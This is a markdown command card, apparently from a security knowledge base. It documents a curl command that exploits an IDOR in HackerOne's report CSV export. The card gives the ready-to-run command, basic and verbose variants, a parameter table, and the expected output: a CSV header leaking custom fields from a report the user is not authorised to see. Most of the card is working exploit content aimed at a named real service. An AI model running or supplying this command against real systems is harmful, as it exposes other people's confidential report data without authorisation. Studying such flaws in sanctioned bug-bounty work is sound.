---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://hackerone.com/reports/export' -H 'Cookie:
  your_session_cookie_here' -F 'report_ids[]=17' -F 'report_ids[]=118' --output
  hackerone_export.csv
tags:
  - web
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:34.513Z'
verified: false
validated: true
submitted: true
---
# curl-hackerone-csv-export-idor

## Command

```bash
curl -X POST 'https://hackerone.com/reports/export' \
  -H 'Cookie: your_session_cookie_here' \
  -F 'report_ids[]=17' \
  -F 'report_ids[]=118' \
  --output hackerone_export.csv
```

## Description

This curl command exploits an IDOR in HackerOne's report CSV export by submitting mixed authorized (17) and unauthorized (118) report IDs via multipart form-data, triggering disclosure of custom field attributes in the CSV header. Use it in authenticated sessions to test for unauthorized data leakage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://hackerone.com/reports/export'` | Target endpoint URL | Yes |
| `-H 'Cookie: ...'` | Authentication header with session cookie | Yes |
| `-F 'report_ids[]=17'` | Form field for authorized report ID | Yes |
| `-F 'report_ids[]=118'` | Form field for unauthorized report ID | Yes |
| `--output hackerone_export.csv` | Saves response to file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/reports/export' -H 'Cookie: session=abc123' -F 'report_ids[]=17' -F 'report_ids[]=118' --output export.csv
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://hackerone.com/reports/export' -H 'Cookie: session=abc123' -F 'report_ids[]=17' -F 'report_ids[]=118' -F 'format=csv' --output export.csv
```

## Expected Output

A CSV file (hackerone_export.csv) downloaded with headers including leaked custom fields, e.g., first line: "id,title,state,custom_field_1,custom_field_2,custom_field_3,custom_field_4,custom_field_5,custom_field_6". Success if unauthorized fields like custom_field_5 appear.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-HackerOne-Report-CSV-Export]]
